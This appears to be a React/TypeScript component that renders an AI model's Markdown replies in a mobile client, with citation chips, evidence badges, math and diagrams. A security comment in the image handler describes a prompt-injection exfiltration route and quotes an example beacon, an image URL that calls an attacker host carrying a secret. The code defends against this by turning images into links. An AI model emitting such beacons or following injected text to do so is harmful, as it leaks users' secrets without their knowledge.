import { EvidenceBadge } from "@/components/EvidenceBadge";
import { MermaidDiagram } from "@/components/MermaidDiagram";
import { remarkCitations } from "@/components/remarkCitations";
import { remarkEvidence } from "@/components/remarkEvidence";
// Assistant-message Markdown for the mobile client (前端技术与架构 §七 · 富渲染).
//
// Full stack now (matches desktop coverage, minimal-deps variant): react-markdown +
// remark-gfm (headings/lists/tables/task lists/code) + remark-math & rehype-katex (math)
// + rehype-highlight (token-class code highlighting, themed via markdown.css onto the
// semantic tokens) + lazy mermaid (```mermaid → diagram, dynamically imported so it never
// bloats the main bundle) + inline `[n]` / `#rN` citation chips (remarkCitations →
// `citemark` via data.hProperties, resolved against citations + evidence ledger).
//
// This is a pure rendering leaf (no drift surface — it never touches the protocol fold).
import type {
  Citation,
  EvidenceLedgerEntry,
  TurnEvidenceLedgerEntry,
} from "@agentcore/contract-types";
import { type ReactNode, memo, useMemo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import "katex/dist/katex.min.css";
import "@/components/markdown.css";

const rehypePlugins = [rehypeKatex, rehypeHighlight];

type LedgerLike = TurnEvidenceLedgerEntry | EvidenceLedgerEntry;

function ledgerEntryAsCitation(entry: LedgerLike): Citation | null {
  const url = (entry.url ?? "").trim();
  if (!url) return null;
  const turn = entry as TurnEvidenceLedgerEntry;
  return {
    url,
    title: entry.title ?? "",
    snippet: entry.snippet ?? "",
    site: entry.site ?? "",
    id: entry.id,
    date: entry.date,
    tier: entry.tier,
    query: turn.query,
    deep_read: turn.deep_read,
    registrant: turn.registrant,
    citable: turn.citable,
  };
}

function resolveLedgerCitation(
  ledgerId: string,
  citations: Citation[],
  evidenceLedger: readonly LedgerLike[] | null | undefined,
): Citation | null {
  const byId = citations.find((c) => c.id === ledgerId);
  if (byId?.url) return byId;
  const entry = evidenceLedger?.find((e) => e.id === ledgerId);
  if (!entry) return null;
  const asCite = ledgerEntryAsCitation(entry);
  if (!asCite) return null;
  const byUrl = citations.find((c) => c.url === asCite.url);
  return byUrl ?? asCite;
}

function CitationChip({
  "data-n": dataN,
  "data-ledger-id": dataLedgerId,
  citations,
  evidenceLedger,
}: {
  "data-n"?: string;
  "data-ledger-id"?: string;
  children?: ReactNode;
  citations: Citation[];
  evidenceLedger?: readonly LedgerLike[] | null;
}) {
  if (dataLedgerId) {
    const source = resolveLedgerCitation(
      dataLedgerId,
      citations,
      evidenceLedger,
    );
    if (!source?.url) return <>{dataLedgerId}</>;
    const n =
      citations.findIndex(
        (c) => c.id === dataLedgerId || c.url === source.url,
      ) + 1;
    const label =
      n > 0 ? n : Number(/^#r(\d+)$/.exec(dataLedgerId)?.[1]) || dataLedgerId;
    return (
      <a
        className="cite-chip"
        href={source.url}
        target="_blank"
        rel="noreferrer"
        title={source.title || source.url}
        aria-label={`来源 ${label}（${dataLedgerId}）`}
      >
        {label}
      </a>
    );
  }
  const n = Number(dataN);
  if (!Number.isFinite(n) || n < 1) {
    return <>{dataN != null ? `[${dataN}]` : null}</>;
  }
  const source = citations[n - 1];
  if (source?.url) {
    return (
      <a
        className="cite-chip"
        href={source.url}
        target="_blank"
        rel="noreferrer"
        title={source.title || source.url}
      >
        {n}
      </a>
    );
  }
  return <sup className="cite-chip">{n}</sup>;
}

/** Render Markdown text. `muted` reads a notch quieter (a turn's reasoning) than the
 *  answer body. `citations`, when present, turns inline `[n]` markers into chips that
 *  link to the matching source. `#rN` also rewrites when ledger ids are known
 *  (citations[].id / evidenceLedger). `evidence` (debate speech only, 举证责任) turns
 *  inline `【已核实·出处】` / `【待核实·推断】` markers into {@link EvidenceBadge} chips. */
export const Markdown = memo(function Markdown({
  content,
  muted = false,
  citations,
  evidenceLedger = null,
  evidence = false,
}: {
  content: string;
  muted?: boolean;
  citations?: Citation[];
  evidenceLedger?:
    | readonly TurnEvidenceLedgerEntry[]
    | readonly EvidenceLedgerEntry[]
    | null;
  evidence?: boolean;
}) {
  const citationCount = citations?.length ?? 0;
  const knownLedgerIds = useMemo(() => {
    const ids = new Set<string>();
    for (const e of evidenceLedger ?? []) {
      if (e.id) ids.add(e.id);
    }
    for (const c of citations ?? []) {
      if (c.id) ids.add(c.id);
    }
    return ids.size > 0 ? ids : null;
  }, [evidenceLedger, citations]);
  const ledgerIdCount = knownLedgerIds?.size ?? 0;

  const remarkPlugins = useMemo(() => {
    if (citationCount <= 0 && ledgerIdCount <= 0 && !evidence) {
      return [remarkGfm, remarkMath];
    }
    return [
      remarkGfm,
      remarkMath,
      ...(citationCount > 0 || ledgerIdCount > 0
        ? [remarkCitations(citationCount, knownLedgerIds)]
        : []),
      ...(evidence ? [remarkEvidence()] : []),
    ];
  }, [citationCount, ledgerIdCount, knownLedgerIds, evidence]);

  const components = useMemo<Components>(() => {
    const pool = citations ?? [];
    const base: Components = {
      a({ href, children, ...props }) {
        return (
          <a href={href} target="_blank" rel="noreferrer" {...props}>
            {children}
          </a>
        );
      },
      img({ src, alt }) {
        // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
        // image to a click-to-open link — never an auto-loading <img>. No rehype-raw is
        // loaded, so `![](url)` is the only image path; without this an injected
        // `![](http://attacker/?d=<secret>)` would fetch on render = a silent, no-click
        // exfil beacon. As a link, egress needs an explicit user click.
        const href = typeof src === "string" ? src : undefined;
        const label =
          typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
        if (!href) return <>{label}</>;
        return (
          <a href={href} target="_blank" rel="noreferrer">
            {label}
          </a>
        );
      },
      code({ className, children, ...props }) {
        const lang = /language-(\w+)/.exec(className || "")?.[1];
        if (lang === "mermaid") {
          return <MermaidDiagram chart={String(children).replace(/\n$/, "")} />;
        }
        return (
          <code className={className} {...props}>
            {children}
          </code>
        );
      },
    };
    if (citationCount > 0 || ledgerIdCount > 0) {
      const CiteMark = (props: {
        "data-n"?: string;
        "data-ledger-id"?: string;
        children?: ReactNode;
      }) => (
        <CitationChip
          data-n={props["data-n"]}
          data-ledger-id={props["data-ledger-id"]}
          citations={pool}
          evidenceLedger={evidenceLedger}
        >
          {props.children}
        </CitationChip>
      );
      (base as Record<string, unknown>).citemark = CiteMark;
    }
    // 举证徽章（举证责任）：remarkEvidence 产出的自定义 `evidencemark` 映射到 EvidenceBadge。走
    // data.hProperties 而非 cite: 链接 url——后者会被 react-markdown 的 urlTransform 清空。仅辩论
    // 发言 opt-in（evidence=true），不扰其余 markdown。
    if (evidence) {
      (base as Record<string, unknown>).evidencemark = EvidenceBadge;
    }
    return base;
  }, [citations, evidenceLedger, citationCount, ledgerIdCount, evidence]);

  return (
    <div className={`md${muted ? " md-muted" : ""}`}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={rehypePlugins}
        components={components}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
});
